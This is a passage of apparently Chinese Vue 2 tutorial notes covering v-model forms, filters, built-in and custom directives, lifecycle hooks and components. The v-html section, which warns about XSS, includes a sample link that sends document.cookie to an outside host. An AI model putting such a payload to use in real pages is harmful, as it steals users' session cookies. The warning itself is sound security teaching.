<li>v-model的初始值是数组，那么收集的的就是value组成的数组</li>
</ul>
</li>
</ul>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;form @submit.prevent=&quot;demo&quot;&gt;
        爱好：
        学习&lt;input type=&quot;checkbox&quot; v-model=&quot;userInfo.hobby&quot; value=&quot;study&quot;&gt;
        打游戏&lt;input type=&quot;checkbox&quot; v-model=&quot;userInfo.hobby&quot; value=&quot;game&quot;&gt;
        吃饭&lt;input type=&quot;checkbox&quot; v-model=&quot;userInfo.hobby&quot; value=&quot;eat&quot;&gt;
        &lt;br/&gt;&lt;br/&gt;
        所属校区
        &lt;select v-model=&quot;userInfo.city&quot;&gt;
            &lt;option value=&quot;&quot;&gt;请选择校区&lt;/option&gt;
            &lt;option value=&quot;beijing&quot;&gt;北京&lt;/option&gt;
            &lt;option value=&quot;shanghai&quot;&gt;上海&lt;/option&gt;
            &lt;option value=&quot;shenzhen&quot;&gt;深圳&lt;/option&gt;
            &lt;option value=&quot;wuhan&quot;&gt;武汉&lt;/option&gt;
        &lt;/select&gt;
        &lt;br/&gt;&lt;br/&gt;
        其他信息：
        &lt;textarea v-model.lazy=&quot;userInfo.other&quot;&gt;&lt;/textarea&gt; &lt;br/&gt;&lt;br/&gt;
        &lt;input type=&quot;checkbox&quot; v-model=&quot;userInfo.agree&quot;&gt;阅读并接受&lt;a href=&quot;http://www.atguigu.com&quot;&gt;《用户协议》&lt;/a&gt;
        &lt;button&gt;提交&lt;/button&gt;
    &lt;/form&gt;
&lt;/div&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
    Vue.config.productionTip = false

    new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            userInfo:&#123;
                hobby:[],
                city:&#39;beijing&#39;,
                other:&#39;&#39;,
                agree:&#39;&#39;
            &#125;
        &#125;,
        methods: &#123;
            demo()&#123;
                console.log(JSON.stringify(this.userInfo))
            &#125;
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<img src="image-20230406174738357.png" alt="image-20230406174738357" style="zoom:67%;border: 5px solid orange;" />





<h3 id="1-15-1-總結"><a href="#1-15-1-總結" class="headerlink" title="1.15.1 總結"></a>1.15.1 總結</h3><p>收集表單數據總結：</p>
<ul>
<li><p>若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。</p>
</li>
<li><p>若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。</p>
</li>
<li><p>若：<input type="checkbox"/></p>
<ul>
<li>没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）</li>
<li>配置input的value属性:<ul>
<li>v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）</li>
<li>v-model的初始值是数组，那么收集的的就是value组成的数组</li>
</ul>
</li>
</ul>
</li>
<li><p>备注：v-model的三个修饰符：</p>
<ul>
<li>lazy：失去焦点再收集数据</li>
<li>number：输入字符串转为有效的数字</li>
<li>trim：输入首尾空格过滤</li>
</ul>
</li>
</ul>
<h2 id="1-16-过滤器（非重点）"><a href="#1-16-过滤器（非重点）" class="headerlink" title="1.16 过滤器（非重点）"></a>1.16 过滤器（非重点）</h2><p>定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。</p>
<p><strong>语法：</strong></p>
<ul>
<li>注册过滤器：<code>Vue.filter(name,callback)</code> 或 <code>new Vue&#123;filters:&#123;&#125;&#125;</code></li>
<li>使用过滤器：<code>&#123;&#123; xxx | 过滤器名&#125;&#125;</code>  或  v-bind:属性 = “xxx | 过滤器名”</li>
</ul>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;h2&gt;显示格式化后的时间&lt;/h2&gt;
    &lt;!-- 计算属性实现 --&gt;
    &lt;h3&gt;现在是：&#123;&#123; fmtTime &#125;&#125;&lt;/h3&gt;
    &lt;!-- methods实现 --&gt;
    &lt;h3&gt;现在是：&#123;&#123; getFmtTime() &#125;&#125;&lt;/h3&gt;
    &lt;!-- 过滤器实现 --&gt;
    &lt;h3&gt;现在是：&#123;&#123;time | timeFormater&#125;&#125;&lt;/h3&gt;
    &lt;!-- 过滤器实现（传参） --&gt;
    &lt;h3&gt;现在是：&#123;&#123;time | timeFormater('YYYY_MM_DD') | mySlice&#125;&#125;&lt;/h3&gt;
    &lt;h3 :x=&quot;msg | mySlice&quot;&gt;尚硅谷&lt;/h3&gt;
&lt;/div&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
    Vue.config.productionTip = false
    //全局过滤器
    Vue.filter(&#39;mySlice&#39;,function(value)&#123;
        return value.slice(0,4)
    &#125;)

    new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            time:1621561377603, //时间戳
            msg:&#39;你好，尚硅谷&#39;
        &#125;,
        computed: &#123;
            fmtTime()&#123;
                return dayjs(this.time).format(&#39;YYYY年MM月DD日 HH:mm:ss&#39;)
            &#125;
        &#125;,
        methods: &#123;
            getFmtTime()&#123;
                return dayjs(this.time).format(&#39;YYYY年MM月DD日 HH:mm:ss&#39;)
            &#125;
        &#125;,
        //局部过滤器
        filters:&#123;
            timeFormater(value, str=&#39;YYYY年MM月DD日 HH:mm:ss&#39;)&#123;
                // console.log(&#39;@&#39;,value)
                return dayjs(value).format(str)
            &#125;
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<blockquote>
<p>备注：</p>
<p>1.过滤器也可以接收额外参数、多个过滤器也可以串联</p>
<p>2.并没有改变原本的数据, 是产生新的对应的数据</p>
</blockquote>
<h2 id="1-17-内置指令"><a href="#1-17-内置指令" class="headerlink" title="1.17 内置指令"></a>1.17 内置指令</h2><blockquote>
<p>複習之前學過的指令：</p>
<ul>
<li>v-bind：單向綁定解析表達式，可簡寫為:xxx</li>
<li>v-model：雙向數據綁定</li>
<li>v-for：遍歷數組/對象/字符串</li>
<li>v-on：綁定事件監聽，可簡寫為@</li>
<li>v-if：條件渲染(動態控制節點是否存在)</li>
<li>v-else：條件渲染(動態控制節點是否存在)</li>
<li>v-show：條件渲染(動態控制節點是否展示)</li>
</ul>
</blockquote>
<h3 id="1-17-1-v-text指令：-使用的比较少"><a href="#1-17-1-v-text指令：-使用的比较少" class="headerlink" title="1.17.1 v-text指令：(使用的比较少)"></a>1.17.1 <strong>v-text指令：</strong>(使用的比较少)</h3><p>1.作用：向其所在的节点中渲染文本内容。</p>
<p>2.与插值语法的区别：v-text会替换掉节点中的内容，则不会。</p>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;div&gt;你好，&#123;&#123;name&#125;&#125;&lt;/div&gt;
    &lt;div v-text=&quot;name&quot;&gt;&lt;/div&gt;
    &lt;div v-text=&quot;str&quot;&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            name:&#39;张三&#39;,
            str:&#39;&lt;h3&gt;你好啊！&lt;/h3&gt;&#39;
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<h3 id="1-17-2-v-html指令：-使用的很少"><a href="#1-17-2-v-html指令：-使用的很少" class="headerlink" title="1.17.2 v-html指令：(使用的很少)"></a>1.17.2 <strong>v-html指令：</strong>(使用的很少)</h3><p>1.作用：向指定节点中渲染包含html结构的内容。</p>
<p>2.与插值语法的区别：</p>
<ul>
<li>v-html会替换掉节点中所有的内容，则不会。</li>
<li>v-html可以识别html结构。</li>
</ul>
<p>3.严重注意：<font color=red><strong>v-html有安全性问题！</strong></font></p>
<ul>
<li>在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。</li>
<li>一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！</li>
</ul>
<pre><code class="js">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;div&gt;你好，&#123;&#123;name&#125;&#125;&lt;/div&gt;
    &lt;div v-html=&quot;str&quot;&gt;&lt;/div&gt;
    &lt;div v-html=&quot;str2&quot;&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            name:&#39;张三&#39;,
            str:&#39;&lt;h3&gt;你好啊！&lt;/h3&gt;&#39;,
            str2:&#39;&lt;a href=javascript:location.href=&quot;http://www.baidu.com?&quot;+document.cookie&gt;兄弟我找到你想要的资源了，快来！&lt;/a&gt;&#39;,
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<h3 id="1-17-3-v-cloak指令（没有值）："><a href="#1-17-3-v-cloak指令（没有值）：" class="headerlink" title="1.17.3 v-cloak指令（没有值）："></a>1.17.3 <strong>v-cloak指令（没有值）：</strong></h3><ul>
<li>本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。</li>
<li>使用css配合v-cloak可以解决网速慢时页面展示出的问题。</li>
</ul>
<pre><code class="html">&lt;style&gt;
    [v-cloak]&#123;
        display:none;
    &#125;
&lt;/style&gt;
&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;h2 v-cloak&gt;&#123;&#123;name&#125;&#125;&lt;/h2&gt;
&lt;/div&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;http://localhost:8080/resource/5s/vue.js&quot;&gt;&lt;/script&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
    console.log(1)
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            name:&#39;尚硅谷&#39;
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<h3 id="1-17-4-v-once指令：-用的少"><a href="#1-17-4-v-once指令：-用的少" class="headerlink" title="1.17.4 v-once指令：(用的少)"></a>1.17.4 <strong>v-once指令：</strong>(用的少)</h3><ul>
<li>v-once所在节点在初次动态渲染后，就视为静态内容了。</li>
<li>以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。</li>
</ul>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;h2 v-once&gt;初始化的n值是:&#123;&#123; n &#125;&#125;&lt;/h2&gt;
    &lt;h2&gt;当前的n值是:&#123;&#123; n &#125;&#125;&lt;/h2&gt;
    &lt;button @click=&quot;n++&quot;&gt;点我n+1&lt;/button&gt;
&lt;/div&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            n:1
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<h3 id="1-17-5-v-pre指令：-比较没用"><a href="#1-17-5-v-pre指令：-比较没用" class="headerlink" title="1.17.5 v-pre指令：(比较没用)"></a>1.17.5 <strong>v-pre指令：</strong>(比较没用)</h3><ul>
<li>跳过其所在节点的编译过程</li>
<li>可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译</li>
</ul>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;h2 v-pre&gt;Vue其实很简单&lt;/h2&gt;
    &lt;h2 &gt;当前的n值是:&#123;&#123;n&#125;&#125;&lt;/h2&gt;
    &lt;button @click=&quot;n++&quot;&gt;点我n+1&lt;/button&gt;
&lt;/div&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            n:1
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<h2 id="1-18-自定义指令"><a href="#1-18-自定义指令" class="headerlink" title="1.18 自定义指令"></a>1.18 自定义指令</h2><h3 id="1-18-1-如何自定義指令"><a href="#1-18-1-如何自定義指令" class="headerlink" title="1.18.1 如何自定義指令"></a>1.18.1 如何自定義指令</h3><p>以下面兩個需求來演示如何自定義指令：</p>
<ul>
<li><p>需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。</p>
</li>
<li><p>需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。</p>
</li>
</ul>
<blockquote>
<p>需求1代碼</p>
</blockquote>
<img src="image-20230407170311153.png" alt="image-20230407170311153" style="zoom:67%;" />



<blockquote>
<p>需求2代碼</p>
</blockquote>
<img src="image-20230407170432347.png" alt="image-20230407170432347" style="zoom:67%;" />



<h3 id="1-18-2-局部指令與全局指令"><a href="#1-18-2-局部指令與全局指令" class="headerlink" title="1.18.2 局部指令與全局指令"></a>1.18.2 局部指令與全局指令</h3><h5 id="1-局部指令"><a href="#1-局部指令" class="headerlink" title="1. 局部指令"></a>1. 局部指令</h5><p>在當前Vue對象的 <em><strong>directives</strong></em> 中配置，僅可在當前的Vue對象中使用</p>
<pre><code class="js">new Vue(&#123;
    el: &#39;#root&#39;,
    data: &#123;
        name:&#39;尚硅谷&#39;,
        n:1
    &#125;,
    directives: &#123;
        // big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
        /* &#39;big-number&#39;(element,binding)&#123;
                    // console.log(&#39;big&#39;)
                    element.innerText = binding.value * 10
                &#125;, */
        big (element,binding)&#123;
            console.log(&#39;big&#39;,this) //注意此处的this是window
            // console.log(&#39;big&#39;)
            element.innerText = binding.value * 10
        &#125;,
        fbind: &#123;
            //指令与元素成功绑定时（一上来）
            bind (element,binding)&#123;
                element.value = binding.value
            &#125;,
            //指令所在元素被插入页面时
            inserted (element,binding)&#123;
                element.focus()
            &#125;,
            //指令所在的模板被重新解析时
            update (element,binding)&#123;
                element.value = binding.value
            &#125;
        &#125;
    &#125;
&#125;)
</code></pre>
<h5 id="2-全局指令"><a href="#2-全局指令" class="headerlink" title="2. 全局指令"></a>2. 全局指令</h5><p>使用***Vue.directive()***配置指令，可在全部的Vue對象中使用</p>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;input type=&quot;text&quot; v-fbind:value=&quot;n&quot;&gt;
&lt;/div&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
    Vue.config.productionTip = false

    //定义全局指令
    Vue.directive(&#39;fbind&#39;, &#123;
        // 指令与元素成功绑定时（一上来）
        bind(element, binding)&#123;
            element.value = binding.value
        &#125;,
        // 指令所在元素被插入页面时
        inserted(element, binding)&#123;
            element.focus()
        &#125;,
        // 指令所在的模板被重新解析时
        update(element, binding)&#123;
            element.value = binding.value
        &#125;
    &#125;)

    new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            name: &#39;尚硅谷&#39;,
            n: 1
        &#125;
    &#125;)

&lt;/script&gt;
</code></pre>
<h3 id="1-18-3-自定義指令總結"><a href="#1-18-3-自定義指令總結" class="headerlink" title="1.18.3 自定義指令總結"></a>1.18.3 自定義指令總結</h3><ul>
<li>定義語法：<ul>
<li>局部指令：new Vue({     directives:{指令名:配置對象}    })        或        new Vue({    directives{指令名,回調函數}    })</li>
<li>全局指令：Vue.directive(指令名,配置對象)                                 或        Vue.directive(指令名,回調函數)</li>
</ul>
</li>
<li>配置對象中常用的3個回調：<ul>
<li>bind：指令与元素成功绑定时调用。</li>
<li>inserted：指令所在元素被插入页面时调用。</li>
<li>update：指令所在模板结构被重新解析时调用。</li>
</ul>
</li>
<li>備註：<ul>
<li>指令定義時不加v-，但使用時要加v-</li>
<li>指令名如果是多個單詞，要使用kebab-case命名方式 (ex：user-name)，不要使用camelCase命名  (ex：userName)</li>
</ul>
</li>
</ul>
<h2 id="1-19-生命周期"><a href="#1-19-生命周期" class="headerlink" title="1.19 生命周期"></a>1.19 生命周期</h2><h3 id="1-19-1-生命周期流程"><a href="#1-19-1-生命周期流程" class="headerlink" title="1.19.1 生命周期流程"></a>1.19.1 生命周期流程</h3><p>Vue 实例有⼀个完整的⽣命周期，也就是从new Vue()、初始化事件(.once事件)和生命周期、编译模版、挂载Dom -&gt; 渲染、更新 -&gt; 渲染、卸载 等⼀系列过程，称这是Vue的⽣命周期。</p>
<p><img src="/2023/04/17/15_Vue%E7%AD%86%E8%A8%98/image-20230406174750773.png" alt="image-20230406174750773"></p>
<h3 id="1-19-2-生命週期分析"><a href="#1-19-2-生命週期分析" class="headerlink" title="1.19.2 生命週期分析"></a>1.19.2 生命週期分析</h3><ol>
<li><strong>beforeCreate（创建前）</strong>：数据监测(getter和setter)和初始化事件还未开始，此时 data 的响应式追踪、event/watcher 都还没有被设置，也就是说不能访问到data、computed、watch、methods上的方法和数据。</li>
<li><strong>created（创建后）</strong>：实例创建完成，实例上配置的 options 包括 data、computed、watch、methods 等都配置完成，但是此时渲染得节点还未挂载到 DOM，所以不能访问到 <code>$el</code>属性。</li>
<li><strong>beforeMount（挂载前）</strong>：在挂载开始之前被调用，相关的render函数首次被调用。此阶段Vue开始解析模板，生成虚拟DOM存在内存中，还没有把虚拟DOM转换成真实DOM，插入页面中。所以网页不能显示解析好的内容。</li>
<li><strong>mounted（挂载后）</strong>：在el被新创建的 vm.$el（就是真实DOM的拷贝）替换，并挂载到实例上去之后调用（将内存中的虚拟DOM转为真实DOM，真实DOM插入页面）。此时页面中呈现的是经过Vue编译的DOM，这时在这个钩子函数中对DOM的操作可以有效，但要尽量避免。一般在这个阶段进行：开启定时器，发送网络请求，订阅消息，绑定自定义事件等等</li>
<li><strong>beforeUpdate（更新前）</strong>：响应式数据更新时调用，此时虽然响应式数据更新了，但是对应的真实 DOM 还没有被渲染（数据是新的，但页面是旧的，页面和数据没保持同步呢）。</li>
<li><strong>updated（更新后）</strong> ：在由于数据更改导致的虚拟DOM重新渲染和打补丁之后调用。此时 DOM 已经根据响应式数据的变化更新了。调用时，组件 DOM已经更新，所以可以执行依赖于DOM的操作。然而在大多数情况下，应该避免在此期间更改状态，因为这可能会导致更新无限循环。该钩子在服务器端渲染期间不被调用。</li>
<li><strong>beforeDestroy（销毁前）</strong>：实例销毁之前调用。这一步，实例仍然完全可用，<code>this</code> 仍能获取到实例。在这个阶段一般进行关闭定时器，取消订阅消息，解绑自定义事件。</li>
<li><strong>destroyed（销毁后）</strong>：实例销毁后调用，调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。该钩子在服务端渲染期间不被调用。</li>
</ol>
<ul>
<li>解釋Template</li>
</ul>
<blockquote>
<p>来讲一下图中间大框框的内容</p>
</blockquote>
<img src="image-20230406174801619.png" alt="image-20230406174801619" style="zoom:80%;border: 5px solid orange;" />

<p>先判断有没有 <strong>el</strong> 这个配置项，没有就调用 vm.$mount(el)，如果两个都没有就一直卡着，显示的界面就是最原始的容器的界面。有 <strong>el</strong> 这个配置项，就进行判断有没有 template 这个配置项，没有 template 就将 el 绑定的容器编译为 vue 模板，来个对比图。</p>
<p>没编译前的：</p>
<img src="image-20230406174805333.png" alt="image-20230406174805333" style="zoom:80%;border: 5px solid orange;" />

<p>编译后：</p>
<img src="image-20230406174818899.png" style="zoom:67%;border: 5px solid orange;" />

<p>这个 template 有啥用咧？</p>
<p><strong>第一种情况，有 template：</strong></p>
<p>如果 el 绑定的容器没有任何内容，就一个空壳子，但在 Vue 实例中写了 template，就会编译解析这个 template 里的内容，生成虚拟 DOM，最后将 虚拟 DOM 转为 真实 DOM 插入页面（其实就可以理解为 template 替代了 el 绑定的容器的内容）。</p>
<p><img src="/2023/04/17/15_Vue%E7%AD%86%E8%A8%98/image-20230406174823548.png"></p>
<p><img src="/2023/04/17/15_Vue%E7%AD%86%E8%A8%98/image-20230406174826605.png"></p>
<p><strong>第二种情况，没有 template：</strong></p>
<p>没有 template，就编译解析 el 绑定的容器，生成虚拟 DOM，后面就顺着生命周期执行下去。</p>
<h3 id="1-19-3-總結生命週期"><a href="#1-19-3-總結生命週期" class="headerlink" title="1.19.3 總結生命週期"></a>1.19.3 總結生命週期</h3><ul>
<li>常用的生命週期函數：<ul>
<li>mounted：發送ajax請求、啟動定時器、綁定自定義事件、訂閱消息等【初始化工作】</li>
<li>beforeDesrtroy：清除定時器、解綁自定義事件、取消訂閱消息等【收尾工作】</li>
</ul>
</li>
<li>關於銷毀Vue實例<ul>
<li>銷毀後借助Vue開發者工具看不到任何信息</li>
<li>銷毀後自定義事件會失效，但原生DOM事件依然有效 (ex: alert)</li>
<li>一般不會在beforeDestroy操作數據，因為即使操作數據，也不會在觸發數據更新流程了</li>
</ul>
</li>
</ul>
<h2 id="1-20-非单文件组件"><a href="#1-20-非单文件组件" class="headerlink" title="1.20 非单文件组件"></a>1.20 非单文件组件</h2><h3 id="1-20-1-基本使用"><a href="#1-20-1-基本使用" class="headerlink" title="1.20.1 基本使用"></a>1.20.1 基本使用</h3><p>Vue中使用组件的三大步骤：</p>
<ul>
<li>定义组件(创建组件)</li>
<li>注册组件</li>
<li>使用组件(写组件标签)</li>
</ul>
<h5 id="1-定义组件"><a href="#1-定义组件" class="headerlink" title="1. 定义组件"></a>1. <strong>定义组件</strong></h5><p>使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；</p>
<p>区别如下：</p>
<ul>
<li><p>el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm决定服务哪个容器。</p>
</li>
<li><p>data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系</p>
<blockquote>
<ul>
<li>亦即當數據改變時，其他引用此組件的地方，數據同時改變。</li>
</ul>
</blockquote>
</li>
</ul>
<blockquote>
<ul>
<li>讲解一下面试小问题：data必须写成函数：</li>
</ul>
<p>这是 js 底层设计的原因：举个例子</p>
<blockquote>
<p>对象形式</p>
</blockquote>
<pre><code class="js">let data = &#123;
    a: 99,
    b: 100
&#125;

let x = data;
let y = data;
// x 和 y 引用的都是同一个对象，修改 x 的值， y 的值也会改变
x.a = 66;
console.loh(x); // a:66 b:100
console.log(y); // a:66 b:100
</code></pre>
<blockquote>
<p>函数形式</p>
</blockquote>
<pre><code class="js">function data() &#123;
    return &#123;
        a: 99,
        b: 100
    &#125;
&#125;
let x = data();
let y = data();
console.log(x === y); // false
// 我的理解是函数每调用一次就创建一个新的对象返回给他们
</code></pre>
</blockquote>
<ul>
<li>创建一个组件案例：<em><strong>使用Vue.extend() 创建</strong></em></li>
</ul>
<pre><code class="html">&lt;script type=&quot;text/javascript&quot;&gt;
    Vue.config.productionTip = false

    //第一步：创建school组件
    const school = Vue.extend(&#123;
        template:`
                &lt;div class=&quot;demo&quot;&gt;
                    &lt;h2&gt;学校名称：&#123;&#123;schoolName&#125;&#125;&lt;/h2&gt;
                    &lt;h2&gt;学校地址：&#123;&#123;address&#125;&#125;&lt;/h2&gt;
                    &lt;button @click=&quot;showName&quot;&gt;点我提示学校名&lt;/button&gt;    
                    &lt;/div&gt;
            `,
        // el:&#39;#root&#39;, //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
        data()&#123;
            return &#123;
                schoolName:&#39;尚硅谷&#39;,
                address:&#39;北京昌平&#39;
            &#125;
        &#125;,
        methods: &#123;
            showName()&#123;
                alert(this.schoolName)
            &#125;
        &#125;,
    &#125;)

    //第一步：创建student组件
    const student = Vue.extend(&#123;
        template:`
                &lt;div&gt;
                    &lt;h2&gt;学生姓名：&#123;&#123;studentName&#125;&#125;&lt;/h2&gt;
                    &lt;h2&gt;学生年龄：&#123;&#123;age&#125;&#125;&lt;/h2&gt;
                    &lt;/div&gt;
            `,
        data()&#123;
            return &#123;
                studentName:&#39;张三&#39;,
                age:18
            &#125;
        &#125;
    &#125;)

    //第一步：创建hello组件
    const hello = Vue.extend(&#123;
        template:`
                &lt;div&gt;    
                    &lt;h2&gt;你好啊！&#123;&#123;name&#125;&#125;&lt;/h2&gt;
                &lt;/div&gt;
            `,
        data()&#123;
            return &#123;
                name:&#39;Tom&#39;
            &#125;
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<blockquote>
<p>备注：使用template可以配置组件结构。</p>
</blockquote>
<h5 id="2-注册组件"><a href="#2-注册组件" class="headerlink" title="2. 注册组件"></a>2. <strong>注册组件</strong></h5><ul>
<li>局部注册：靠new Vue的时候传入components选项</li>
<li>全局注册：靠Vue.component(‘组件名’,组件)</li>
</ul>
<blockquote>
<p>局部注册</p>
</blockquote>
<pre><code class="html">&lt;script&gt;
    //创建vm
    new Vue(&#123;
        el: &#39;#root&#39;,
        data: &#123;
            msg:&#39;你好啊！&#39;
        &#125;,
        //第二步：注册组件（局部注册）
        components: &#123;
            school: school,
            student: student
            // ES6简写形式
            // school,
            // student
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<blockquote>
<p>全局注册</p>
</blockquote>
<pre><code class="html">&lt;script&gt;
    //第二步：全局注册组件
    Vue.component(&#39;hello&#39;, hello)
&lt;/script&gt;
</code></pre>
<h5 id="3-写组件标签"><a href="#3-写组件标签" class="headerlink" title="3. 写组件标签"></a>3. <strong>写组件标签</strong></h5><pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;hello&gt;&lt;/hello&gt;
    &lt;hr&gt;
    &lt;h1&gt;&#123;&#123;msg&#125;&#125;&lt;/h1&gt;
    &lt;hr&gt;
    &lt;!-- 第三步：编写组件标签 --&gt;
    &lt;school&gt;&lt;/school&gt;
    &lt;hr&gt;
    &lt;!-- 第三步：编写组件标签 --&gt;
    &lt;student&gt;&lt;/student&gt;
&lt;/div&gt;
</code></pre>
<h5 id="4-小結"><a href="#4-小結" class="headerlink" title="4. 小結"></a>4. 小結</h5><ul>
<li><p>Vue中使用组件的三大步骤：</p>
<ul>
<li><p>定义组件(创建组件)</p>
</li>
<li><p>注册组件</p>
</li>
<li><p>使用组件(写组件标签)</p>
</li>
</ul>
</li>
<li><p>如何定義一個組件?</p>
<ul>
<li><p>使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；</p>
<p>区别如下：</p>
<ul>
<li>el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm决定服务哪个容器。</li>
<li>data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系</li>
</ul>
</li>
<li><p>备注：使用template可以配置组件结构。</p>
</li>
</ul>
</li>
<li><p>如何註冊組件?</p>
<ul>
<li>局部注册：靠new Vue的时候传入components选项</li>
<li>全局注册：靠Vue.component(‘组件名’,组件)</li>
</ul>
</li>
<li><p>編寫組件標籤：</p>
<ul>
<li><school></school></li>
</ul>
</li>
</ul>
<h3 id="1-20-2-使用組件的注意点："><a href="#1-20-2-使用組件的注意点：" class="headerlink" title="1.20.2 使用組件的注意点："></a>1.20.2 <strong>使用組件的注意点：</strong></h3><ul>
<li><p>关于组件名：</p>
<ul>
<li><p>一个单词组成：</p>
<ul>
<li><p>第一种写法(首字母小写)：school</p>
</li>
<li><p>第二种写法(首字母大写)：School</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>多个单词组成：</p>
<ul>
<li><p>第一种写法(kebab-case命名)：my-school</p>
</li>
<li><p>第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)</p>
</li>
</ul>
</li>
</ul>
<blockquote>
<p> 备注：</p>
<p> (1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。</p>
<p> (2).可以使用name配置项指定组件在开发者工具中呈现的名字。</p>
</blockquote>
<ul>
<li><p>关于组件标签:</p>
<ul>
<li>  第一种写法：<school></school></li>
<li>  第二种写法：<school/></li>
</ul>
<blockquote>
<p>备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。</p>
</blockquote>
</li>
</ul>
<ul>
<li><p>一个简写方式：</p>
<ul>
<li>  const school = Vue.extend(options) 可简写为：const school = options</li>
</ul>
</li>
</ul>
<h3 id="1-20-3-组件的嵌套"><a href="#1-20-3-组件的嵌套" class="headerlink" title="1.20.3 组件的嵌套"></a>1.20.3 组件的嵌套</h3><p>比较简单，直接展示代码：</p>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;

&lt;/div&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    //定义student组件
    const student = Vue.extend(&#123;
        name:&#39;student&#39;,
        template:`
                &lt;div&gt;
                    &lt;h2&gt;学生姓名：&#123;&#123;name&#125;&#125;&lt;/h2&gt;    
                    &lt;h2&gt;学生年龄：&#123;&#123;age&#125;&#125;&lt;/h2&gt;    
                &lt;/div&gt;
            `,
        data()&#123;
            return &#123;
                name:&#39;尚硅谷&#39;,
                age:18
            &#125;
        &#125;
    &#125;)

    //定义school组件
    const school = Vue.extend(&#123;
        name:&#39;school&#39;,
        template:`
                &lt;div&gt;
                    &lt;h2&gt;学校名称：&#123;&#123;name&#125;&#125;&lt;/h2&gt;    
                    &lt;h2&gt;学校地址：&#123;&#123;address&#125;&#125;&lt;/h2&gt;    
                    &lt;student&gt;&lt;/student&gt;
                &lt;/div&gt;
            `,
        data()&#123;
            return &#123;
                name:&#39;尚硅谷&#39;,
                address:&#39;北京&#39;
            &#125;
        &#125;,
        // 注册组件（局部）
        components:&#123;
            student
        &#125;
    &#125;)

    //定义hello组件
    const hello = Vue.extend(&#123;
        template:`&lt;h1&gt;&#123;&#123;msg&#125;&#125;&lt;/h1&gt;`,
        data()&#123;
            return &#123;
                msg:&#39;欢迎来到尚硅谷学习！&#39;
            &#125;
        &#125;
    &#125;)

